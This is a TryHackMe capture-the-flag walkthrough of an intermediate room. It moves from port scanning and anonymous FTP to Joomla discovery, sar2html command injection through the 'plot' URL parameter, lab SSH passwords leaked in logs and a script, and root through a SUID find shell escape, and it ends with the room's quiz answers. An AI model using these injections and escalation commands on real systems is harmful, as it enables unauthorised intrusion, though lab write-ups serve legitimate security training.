---
Intermediate level CTF
---

![](https://tryhackme-images.s3.amazonaws.com/room-icons/4a800c6513239dbdfaf74ce869a88add.jpeg)


###  Questions #1

 Start Machine

Intermediate level CTF. Just enumerate, you'll get there.  

Answer the questions below

```
┌──(kali㉿kali)-[~/Downloads]
└─$ rustscan -a 10.10.242.217 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
🌍HACK THE PLANET🌍

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.242.217:21
Open 10.10.242.217:80
Open 10.10.242.217:10000
Open 10.10.242.217:55007
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-02-03 15:48 EST
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:48
Completed NSE at 15:48, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:48
Completed NSE at 15:48, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:48
Completed NSE at 15:48, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 15:48
Completed Parallel DNS resolution of 1 host. at 15:48, 0.02s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 15:48
Scanning 10.10.242.217 [4 ports]
Discovered open port 80/tcp on 10.10.242.217
Discovered open port 21/tcp on 10.10.242.217
Discovered open port 10000/tcp on 10.10.242.217
Discovered open port 55007/tcp on 10.10.242.217
Completed Connect Scan at 15:48, 0.49s elapsed (4 total ports)
Initiating Service scan at 15:48
Scanning 4 services on 10.10.242.217
Completed Service scan at 15:49, 6.86s elapsed (4 services on 1 host)
NSE: Script scanning 10.10.242.217.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:49
NSE: [ftp-bounce 10.10.242.217:21] PORT response: 500 Illegal PORT command.
Completed NSE at 15:49, 30.37s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 1.50s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Nmap scan report for 10.10.242.217
Host is up, received user-set (0.49s latency).
Scanned at 2023-02-03 15:48:56 EST for 40s

PORT      STATE SERVICE REASON  VERSION
21/tcp    open  ftp     syn-ack vsftpd 3.0.3
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.8.19.103
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 2
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
80/tcp    open  http    syn-ack Apache httpd 2.4.18 ((Ubuntu))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
| http-robots.txt: 1 disallowed entry 
|_/
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
10000/tcp open  http    syn-ack MiniServ 1.930 (Webmin httpd)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).
|_http-favicon: Unknown favicon MD5: 89B9DA242498F4DEA6BA126ED685FBDF
55007/tcp open  ssh     syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 e3abe1392d95eb135516d6ce8df911e5 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQC8bsvFyC4EXgZIlLR/7o9EHosUTTGJKIdjtMUyYrhUpJiEdUahT64rItJMCyO47iZTR5wkQx2H8HThHT6iQ5GlMzLGWFSTL1ttIulcg7uyXzWhJMiG/0W4HNIR44DlO8zBvysLRkBSCUEdD95kLABPKxIgCnYqfS3D73NJI6T2qWrbCTaIG5QAS5yAyPERXXz3ofHRRiCr3fYHpVopUbMTWZZDjR3DKv7IDsOCbMKSwmmgdfxDhFIBRtCkdiUdGJwP/g0uEUtHbSYsNZbc1s1a5EpaxvlESKPBainlPlRkqXdIiYuLvzsf2J0ajniPUkvJ2JbC8qm7AaDItepXLoDt
|   256 aedef2bbb78a00702074567625c0df38 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBLIDkrDNUoTTfKoucY3J3eXFICcitdce9/EOdMn8/7ZrUkM23RMsmFncOVJTkLOxOB+LwOEavTWG/pqxKLpk7oc=
|   256 252583f2a7758aa046b2127004685ccb (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIPsAMyp7Cf1qf50P6K9P2n30r4MVz09NnjX7LvcKgG2p
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 15:49
Completed NSE at 15:49, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 44.01 seconds

┌──(kali㉿kali)-[~/Downloads]
└─$ ftp 10.10.242.217
Connected to 10.10.242.217.
220 (vsFTPd 3.0.3)
Name (10.10.242.217:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||46226|)
150 Here comes the directory listing.
226 Directory send OK.
ftp> ls -la
229 Entering Extended Passive Mode (|||41432|)
150 Here comes the directory listing.
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 .
drwxr-xr-x    2 ftp      ftp          4096 Aug 22  2019 ..
-rw-r--r--    1 ftp      ftp            74 Aug 21  2019 .info.txt
226 Directory send OK.
ftp> more .info.txt
Whfg jnagrq gb frr vs lbh svaq vg. Yby. Erzrzore: Rahzrengvba vf gur xrl!

https://www.dcode.fr/cipher-identifier
ROT13 
Just wanted to see if you find it. Lol. Remember: Enumeration is the key!

view-source:http://10.10.242.217:10000/

<h1>Error - Document follows</h1>
<p>This web server is running in SSL mode. Try the URL <a href='https://ip-10-10-242-217.eu-west-1.compute.internal:10000/'>https://ip-10-10-242-217.eu-west-1.compute.internal:10000/</a> instead.<br></p>

view-source:http://10.10.242.217/robots.txt

User-agent: *
Disallow: /

/tmp
/.ssh
/yellow
/not
/a+rabbit
/hole
/or
/is
/it

079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075

remove spaces

079084108105077068089050077071078107079084086104090071086104077122073051089122085048077084103121089109070104078084069049079068081075

https://www.dcode.fr/ascii-code

OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK (base64)
From Base64
99b0660cd95adea327c54182baa51584
Crackstation (From MD5)

https://crackstation.net/
  
kidding

or doing with python

┌──(kali㉿kali)-[~/Downloads]
└─$ python3                    
Python 3.10.9 (main, Dec  7 2022, 13:47:07) [GCC 12.2.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> a = "079 084 108 105 077 068 089 050 077 071 078 107 079 084 086 104 090 071 086 104 077 122 073 051 089 122 085 048 077 084 103 121 089 109 070 104 078 084 069 049 079 068 081 075"
>>> ''.join([chr(int(i)) for i in a.split(' ')])
'OTliMDY2MGNkOTVhZGVhMzI3YzU0MTgyYmFhNTE1ODQK'
>>> import base64
>>> base64.b64decode(_)
b'99b0660cd95adea327c54182baa51584\n'

99b0660cd95adea327c54182baa51584
Crackstation (From MD5)

https://crackstation.net/
  
kidding

view-source:http://10.10.242.217/.ssh
</head><body>
<h1>Not Found</h1>
<p>The requested URL /.ssh was not found on this server.</p>
<hr>

https://10.10.242.217:10000/

┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://10.10.242.217/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 64 -k       
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.242.217/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/03 16:14:05 Starting gobuster in directory enumeration mode
===============================================================
/manual               (Status: 301) [Size: 315] [--> http://10.10.242.217/manual/]
/joomla               (Status: 301) [Size: 315] [--> http://10.10.242.217/joomla/]
Progress: 57624 / 220561 (26.13%)^C
[!] Keyboard interrupt detected, terminating.
===============================================================
2023/02/03 16:17:20 Finished
===============================================================

Joomla es un sistema de gestión de contenido (CMS) de código abierto escrito en PHP. Se utiliza para crear y administrar sitios web dinámicos, como blogs, tiendas en línea, portafolios, sitios institucionales, etc. Joomla ofrece una amplia gama de funciones y características, incluyendo una interfaz fácil de usar, una amplia variedad de plantillas y extensiones, y una gran comunidad de desarrolladores y usuarios.

┌──(kali㉿kali)-[~/Downloads]
└─$ gobuster dir -u http://10.10.242.217/joomla/ -w /usr/share/wordlists/dirb/common.txt -t 64 -k  
===============================================================
Gobuster v3.3
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.242.217/joomla/
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.3
[+] Timeout:                 10s
===============================================================
2023/02/03 16:31:32 Starting gobuster in directory enumeration mode
===============================================================
/_archive             (Status: 301) [Size: 324] [--> http://10.10.242.217/joomla/_archive/]
/_database            (Status: 301) [Size: 325] [--> http://10.10.242.217/joomla/_database/]
/.hta                 (Status: 403) [Size: 299]
/_test                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/_test/]
/~www                 (Status: 301) [Size: 320] [--> http://10.10.242.217/joomla/~www/]
/.htaccess            (Status: 403) [Size: 304]
/administrator        (Status: 301) [Size: 329] [--> http://10.10.242.217/joomla/administrator/]
/.htpasswd            (Status: 403) [Size: 304]
/bin                  (Status: 301) [Size: 319] [--> http://10.10.242.217/joomla/bin/]
/build                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/build/]
/cache                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/cache/]
/_files               (Status: 301) [Size: 322] [--> http://10.10.242.217/joomla/_files/]
/components           (Status: 301) [Size: 326] [--> http://10.10.242.217/joomla/components/]
/images               (Status: 301) [Size: 322] [--> http://10.10.242.217/joomla/images/]
/includes             (Status: 301) [Size: 324] [--> http://10.10.242.217/joomla/includes/]
/index.php            (Status: 200) [Size: 12484]
/installation         (Status: 301) [Size: 328] [--> http://10.10.242.217/joomla/installation/]
/language             (Status: 301) [Size: 324] [--> http://10.10.242.217/joomla/language/]
/layouts              (Status: 301) [Size: 323] [--> http://10.10.242.217/joomla/layouts/]
/libraries            (Status: 301) [Size: 325] [--> http://10.10.242.217/joomla/libraries/]
/media                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/media/]
/modules              (Status: 301) [Size: 323] [--> http://10.10.242.217/joomla/modules/]
/plugins              (Status: 301) [Size: 323] [--> http://10.10.242.217/joomla/plugins/]
/templates            (Status: 301) [Size: 325] [--> http://10.10.242.217/joomla/templates/]
/tests                (Status: 301) [Size: 321] [--> http://10.10.242.217/joomla/tests/]
/tmp                  (Status: 301) [Size: 319] [--> http://10.10.242.217/joomla/tmp/]
Progress: 4547 / 4615 (98.53%)===============================================================
2023/02/03 16:31:51 Finished
===============================================================


http://10.10.242.217/joomla/administrator/index.php
http://10.10.242.217/joomla/_files/

┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s http://10.10.242.217/joomla/_files/ | html2text
                  ****** VjJodmNITnBaU0JrWVdsemVRbz0K ******
                                                                    
┌──(kali㉿kali)-[~/Downloads]
└─$ echo 'VjJodmNITnBaU0JrWVdsemVRbz0K' | base64 -d
V2hvcHNpZSBkYWlzeQo=
                                                                    
┌──(kali㉿kali)-[~/Downloads]
└─$ echo 'V2hvcHNpZSBkYWlzeQo=' | base64 -d
Whopsie daisy

cyberchef
VjJodmNITnBaU0JrWVdsemVRbz0K  Whopsie daisy

http://10.10.242.217/joomla/tests/codeception/_data/

Nothing

┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s http://10.10.242.217/joomla/_database/ | html2text
                      ****** Lwuv oguukpi ctqwpf. ******
https://www.dcode.fr/rot-cipher
Just messing around.
https://quipqiup.com/

┌──(kali㉿kali)-[~/Downloads]
└─$ curl -s http://10.10.242.217/joomla/~www/ | html2text     
                      ****** Mnope, nothin to see. ******

http://10.10.242.217/joomla/_test/

sar2html

https://www.exploit-db.com/exploits/47204

http://10.10.242.217/joomla/_test/index.php?plot=;whoami

Select Host
www-data


http://10.10.242.217/joomla/_test/index.php?plot=;ls

Select Host
log.txt

http://10.10.242.217/joomla/_test/index.php?plot=;cat%20log.txt

inspect

<select class="select_text" name="host" onchange="this.form.submit();"><option value="null" selected="">Select Host</option><option value="HPUX">HPUX</option><option value="Linux">Linux</option><option value="SunOS">SunOS</option><option value="Aug" 20="" 11:16:26="" parrot="" sshd[2443]:="" server="" listening="" on="" 0.0.0.0="" port="" 22.="">Aug 20 11:16:26 parrot sshd[2443]: Server listening on 0.0.0.0 port 22.</option><option value="Aug" 20="" 11:16:26="" parrot="" sshd[2443]:="" server="" listening="" on="" ::="" port="" 22.="">Aug 20 11:16:26 parrot sshd[2443]: Server listening on :: port 22.</option><option value="Aug" 20="" 11:16:35="" parrot="" sshd[2451]:="" accepted="" password="" for="" basterd="" from="" 10.1.1.1="" port="" 49824="" ssh2="" #pass:="" superduperp@$$="">Aug 20 11:16:35 parrot sshd[2451]: Accepted password for basterd from 10.1.1.1 port 49824 ssh2 #pass: superduperp@$$</option>Aug 20 11:16:35 parrot sshd[2451]: pam_unix(sshd:session): session opened for user pentest by (uid=0)<option value="Aug" 20="" 11:16:35="" parrot="" sshd[2451]:="" pam_unix(sshd:session):="" session="" opened="" for="" user="" pentest="" by="" (uid="0)"></option><option value="Aug" 20="" 11:16:36="" parrot="" sshd[2466]:="" received="" disconnect="" from="" 10.10.170.50="" port="" 49824:11:="" disconnected="" by="" user="">Aug 20 11:16:36 parrot sshd[2466]: Received disconnect from 10.10.170.50 port 49824:11: disconnected by user</option><option value="Aug" 20="" 11:16:36="" parrot="" sshd[2466]:="" disconnected="" from="" user="" pentest="" 10.10.170.50="" port="" 49824="">Aug 20 11:16:36 parrot sshd[2466]: Disconnected from user pentest 

SSH


basterd:superduperp@$$

┌──(kali㉿kali)-[~/Downloads]
└─$ ssh basterd@10.10.242.217 -p 55007
The authenticity of host '[10.10.242.217]:55007 ([10.10.242.217]:55007)' can't be established.
ED25519 key fingerprint is SHA256:GhS3mY+uTmthQeOzwxRCFZHv1MN2hrYkdao9HJvi8lk.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.242.217]:55007' (ED25519) to the list of known hosts.
basterd@10.10.242.217's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic i686)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

8 packages can be updated.
8 updates are security updates.


Last login: Thu Aug 22 12:29:45 2019 from 192.168.1.199
$ whoami
basterd

basterd@Vulnerable:~$ cd /home
basterd@Vulnerable:/home$ ls
basterd  stoner
basterd@Vulnerable:/home$ cd basterd
basterd@Vulnerable:~$ ls
backup.sh
basterd@Vulnerable:~$ cat backup.sh
REMOTE=1.2.3.4

SOURCE=/home/stoner
TARGET=/usr/local/backup

LOG=/home/stoner/bck.log
 
DATE=`date +%y\.%m\.%d\.`

USER=stoner
#superduperp@$$no1knows

ssh $USER@$REMOTE mkdir $TARGET/$DATE


if [ -d "$SOURCE" ]; then
    for i in `ls $SOURCE | grep 'data'`;do
	     echo "Begining copy of" $i  >> $LOG
	     scp  $SOURCE/$i $USER@$REMOTE:$TARGET/$DATE
	     echo $i "completed" >> $LOG
		
		if [ -n `ssh $USER@$REMOTE ls $TARGET/$DATE/$i 2>/dev/null` ];then
		    rm $SOURCE/$i
		    echo $i "removed" >> $LOG
		    echo "####################" >> $LOG
				else
					echo "Copy not complete" >> $LOG
					exit 0
		fi 
    done
     

else

    echo "Directory is not present" >> $LOG
    exit 0
fi
basterd@Vulnerable:~$ ls -lah
total 16K
drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 .
drwxr-xr-x 4 root    root    4.0K Aug 22  2019 ..
-rwxr-xr-x 1 stoner  basterd  699 Aug 21  2019 backup.sh
-rw------- 1 basterd basterd    0 Aug 22  2019 .bash_history
drwx------ 2 basterd basterd 4.0K Aug 22  2019 .cache
basterd@Vulnerable:~$ cat .bash_history
basterd@Vulnerable:~$ cat .cache
cat: .cache: Is a directory
basterd@Vulnerable:~$ cd .cache
basterd@Vulnerable:~/.cache$ ls
motd.legal-displayed
basterd@Vulnerable:~/.cache$ ls -lah
total 8.0K
drwx------ 2 basterd basterd 4.0K Aug 22  2019 .
drwxr-x--- 3 basterd basterd 4.0K Aug 22  2019 ..
-rw-r--r-- 1 basterd basterd    0 Aug 22  2019 motd.legal-displayed
basterd@Vulnerable:~/.cache$ cat motd.legal-displayed

USER=stoner
#superduperp@$$no1knows


basterd@Vulnerable:~/.cache$ su stoner
Password: superduperp@$$no1knows
stoner@Vulnerable:/home/basterd/.cache$ cd /home/stoner
stoner@Vulnerable:~$ ls
stoner@Vulnerable:~$ ls -lah
total 16K
drwxr-x--- 3 stoner stoner 4.0K Aug 22  2019 .
drwxr-xr-x 4 root   root   4.0K Aug 22  2019 ..
drwxrwxr-x 2 stoner stoner 4.0K Aug 22  2019 .nano
-rw-r--r-- 1 stoner stoner   34 Aug 21  2019 .secret
stoner@Vulnerable:~$ cat .secret
You made it till here, well done.
stoner@Vulnerable:~$ cat .nano
cat: .nano: Is a directory
stoner@Vulnerable:~$ cd .nano
stoner@Vulnerable:~/.nano$ ls -lah
total 8.0K
drwxrwxr-x 2 stoner stoner 4.0K Aug 22  2019 .
drwxr-x--- 3 stoner stoner 4.0K Aug 22  2019 ..

stoner@Vulnerable:~/.nano$ sudo -l
User stoner may run the following commands on Vulnerable:
    (root) NOPASSWD: /NotThisTime/MessinWithYa

stoner@Vulnerable:~/.nano$ find / -perm -4000 2>/dev/null | xargs ls -lah
-rwsr-xr-x 1 root   root        30K Jul 12  2016 /bin/fusermount
-rwsr-xr-x 1 root   root        34K May 15  2019 /bin/mount
-rwsr-xr-x 1 root   root        39K May  7  2014 /bin/ping
-rwsr-xr-x 1 root   root        43K May  7  2014 /bin/ping6
-rwsr-xr-x 1 root   root        38K Mar 26  2019 /bin/su
-rwsr-xr-x 1 root   root        26K May 15  2019 /bin/umount
-rwsr-sr-x 1 daemon daemon      50K Jan 15  2016 /usr/bin/at
-rwsr-xr-x 1 root   root        73K Mar 26  2019 /usr/bin/chfn
-rwsr-xr-x 1 root   root        39K Mar 26  2019 /usr/bin/chsh
-r-sr-xr-x 1 root   root       227K Feb  8  2016 /usr/bin/find
-rwsr-xr-x 1 root   root        77K Mar 26  2019 /usr/bin/gpasswd
-rwsr-xr-x 1 root   root        36K Mar 26  2019 /usr/bin/newgidmap
-rwsr-xr-x 1 root   root        34K Mar 26  2019 /usr/bin/newgrp
-rwsr-xr-x 1 root   root        36K Mar 26  2019 /usr/bin/newuidmap
-rwsr-xr-x 1 root   root        52K Mar 26  2019 /usr/bin/passwd
-rwsr-xr-x 1 root   root        18K Mar 27  2019 /usr/bin/pkexec
-rwsr-xr-x 1 root   root       157K Jun 11  2019 /usr/bin/sudo
-rwsr-xr-- 1 root   www-data    14K Apr  3  2019 /usr/lib/apache2/suexec-custom
-rwsr-xr-- 1 root   www-data    14K Apr  3  2019 /usr/lib/apache2/suexec-pristine
-rwsr-xr-- 1 root   messagebus  46K Jun 10  2019 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
-rwsr-xr-x 1 root   root       5.4K Mar 27  2017 /usr/lib/eject/dmcrypt-get-device
-rwsr-xr-x 1 root   root       502K Mar  4  2019 /usr/lib/openssh/ssh-keysign
-rwsr-xr-x 1 root   root        14K Mar 27  2019 /usr/lib/policykit-1/polkit-agent-helper-1

stoner@Vulnerable:~/.nano$ find . -exec /bin/sh -p \; -quit
# whoami
root
# cd /root
# ls
root.txt
# cat root.txt
It wasn't that hard, was it?



```

![[Pasted image 20230203163820.png]]
![[Pasted image 20230203164315.png]]

File extension after anon login  

*txt*

What is on the highest port?  

*ssh*

What's running on port 10000?  

*Webmin*

Can you exploit the service running on that port? (yay/nay answer)  

*nay*

What's CMS can you access?  

*joomla*

Keep enumerating, you'll know when you find it.  

List & read, don't reverse

 Completed

The interesting file name in the folder?

*log.txt*

### Questions #2

You can complete this with manual enumeration, but do it as you wish  

Answer the questions below

Where was the other users pass stored(no extension, just the name)?  

*backup*

user.txt  

*You made it till here, well done.*

What did you exploit to get the privileged user?  

*find*

root.txt

*It wasn't that hard, was it?*

[[GoldenEye]]